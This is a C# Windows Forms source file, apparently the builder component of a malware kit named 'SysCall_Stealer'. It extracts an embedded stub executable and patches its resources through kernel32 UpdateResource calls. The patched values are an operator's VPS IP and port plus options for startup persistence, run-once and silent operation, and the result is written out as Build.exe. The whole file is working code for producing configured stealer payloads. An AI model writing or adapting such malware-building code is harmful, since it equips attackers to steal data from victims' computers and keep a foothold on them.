using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SysCall_Stealer
{
    public partial class Builder : UserControl
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr BeginUpdateResource(string pFileName, bool bDeleteExistingResources);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool UpdateResource(IntPtr hUpdate, IntPtr lpType, IntPtr lpName, ushort wLanguage, byte[] lpData, uint cbData);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool EndUpdateResource(IntPtr hUpdate, bool fDiscard);
        public Builder()
        {
            InitializeComponent();
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {

            if (File.Exists(Environment.CurrentDirectory + "\\Build.exe"))
            {
                File.Delete(Environment.CurrentDirectory + "\\Build.exe");
            }



            if (SynIP.Text == "[ WRITE YOUR VPS IP ]")
            {
                MessageBox.Show(
            "Please Write Your IP or VPS IP!",
            "Information",
            MessageBoxButtons.OK,
            MessageBoxIcon.Information
        );
                return;
            }

            try
            {

                string targetexepathput = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SynStub.exe";

                byte[] targetexefromresources = Properties.Resources.SynStub;


                File.WriteAllBytes(targetexepathput, targetexefromresources);




                byte[] IP = System.Text.Encoding.Unicode.GetBytes(SynIP.Text + "\0");
                byte[] Port = System.Text.Encoding.Unicode.GetBytes(SynPort.Text + "\0");
                byte[] Startup = System.Text.Encoding.Unicode.GetBytes(startupchecktextbox.Text);
                byte[] RunOnceCheck = System.Text.Encoding.Unicode.GetBytes(runoncetextbox.Text);
                byte[] SilentMe = System.Text.Encoding.Unicode.GetBytes(silenttextbox.Text);



                IntPtr hUpdate = BeginUpdateResource(targetexepathput, false);
                if (hUpdate == IntPtr.Zero)
                {
                    MessageBox.Show("Failed to open executable");
                    return;
                }


                bool success1 = UpdateResource(hUpdate, (IntPtr)10, (IntPtr)1, 0, IP, (uint)IP.Length);

                bool success2 = UpdateResource(hUpdate, (IntPtr)10, (IntPtr)2, 0, Port, (uint)Port.Length);

                if (SynStartup.Checked == true)
                {
                    bool success3 = UpdateResource(hUpdate, (IntPtr)10, (IntPtr)3, 0, Startup, (uint)Startup.Length);
                }

                if (RunOnce.Checked == true)
                {
    
                    bool success4 = UpdateResource(hUpdate, (IntPtr)10, (IntPtr)4, 0, RunOnceCheck, (uint)RunOnceCheck.Length);

                }

                if (silentcheckbox.Checked == true)
                {
                    bool success5 = UpdateResource(hUpdate, (IntPtr)10, (IntPtr)5, 0, SilentMe, (uint)SilentMe.Length);
                }



                bool finalSuccess = EndUpdateResource(hUpdate, false);

                if (success1 && success2 && finalSuccess)
                {

                    
                    try
                    {
                        File.Copy(targetexepathput, Environment.CurrentDirectory + "\\Build.exe");
                    }
                    catch
                    {

                    }




                    MessageBox.Show(
         "Build Success!",
         "Information",
         MessageBoxButtons.OK,
         MessageBoxIcon.Information
     );

                    try
                    {
                        File.Delete(targetexepathput);
                    }
                    catch
                    {

                    }

              
                }
                else
                {
                    MessageBox.Show("Failed to Build. Error: " + Marshal.GetLastWin32Error());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error: {ex.Message}");
            }



        }

        private void Builder_Load(object sender, EventArgs e)
        {
            startupchecktextbox.Text = SynStartup.Checked ? "1" : "0";
            runoncetextbox.Text = RunOnce.Checked ? "1" : "0";
            silenttextbox.Text = silentcheckbox.Checked ? "1" : "0";
        }

        private void guna2Panel3_Paint(object sender, PaintEventArgs e)
        {

        }

        private void SynStartup_CheckedChanged(object sender, EventArgs e)
        {
            startupchecktextbox.Text = SynStartup.Checked ? "1" : "0";
        }

        private void RunOnce_CheckedChanged(object sender, EventArgs e)
        {
            runoncetextbox.Text = RunOnce.Checked ? "1" : "0";
        }
        RunOnceHover hoverForm;
        private void RunOnce_MouseHover(object sender, EventArgs e)
        {




            try
            {


                if (hoverForm == null || hoverForm.IsDisposed)
                    hoverForm = new RunOnceHover();

                hoverForm.ShowAtCursor();
            }
            catch
            {

            }


       
        }

        private void RunOnce_MouseLeave(object sender, EventArgs e)
        {

            try
            {


                if (hoverForm != null && !hoverForm.IsDisposed)
                {
                    hoverForm.Close();
                    hoverForm = null;
                }
            }
            catch
            {

            }


           
        }
        StartupHover hoverStartup;
        private void SynStartup_MouseHover(object sender, EventArgs e)
        {


            try
            {


                if (hoverStartup == null || hoverStartup.IsDisposed)
                    hoverStartup = new StartupHover();

                hoverStartup.ShowAtCursor();
            }
            catch
            {

            }




        
        }

        private void SynStartup_MouseLeave(object sender, EventArgs e)
        {

            try
            {


                if (hoverStartup != null && !hoverStartup.IsDisposed)
                {
                    hoverStartup.Close();
                    hoverStartup = null;
                }
            }
            catch
            {

            }




        }
    
        private void SynIP_MouseHover(object sender, EventArgs e)
        {
         
        }

        private void SynIP_MouseLeave(object sender, EventArgs e)
        {
           
        }

        private void SynIP_MouseEnter(object sender, EventArgs e)
        {
          
        }

        private void SynIP_MouseDown(object sender, MouseEventArgs e)
        {
       
        }

        private void silentcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            silenttextbox.Text = silentcheckbox.Checked ? "1" : "0";
        }
        SilentHover silentHover;
        private void silentcheckbox_MouseHover(object sender, EventArgs e)
        {
            try
            {
                if (silentHover == null || silentHover.IsDisposed)
                    silentHover = new SilentHover();

                silentHover.ShowAtCursor();
            }
            catch
            {

            }
            
      
        }

        private void silentcheckbox_MouseLeave(object sender, EventArgs e)
        {


            try
            {

                if (silentHover != null && !silentHover.IsDisposed)
                {
                    silentHover.Close();
                    silentHover = null;
                }
            }
            catch
            {

            }




        }
    }
}
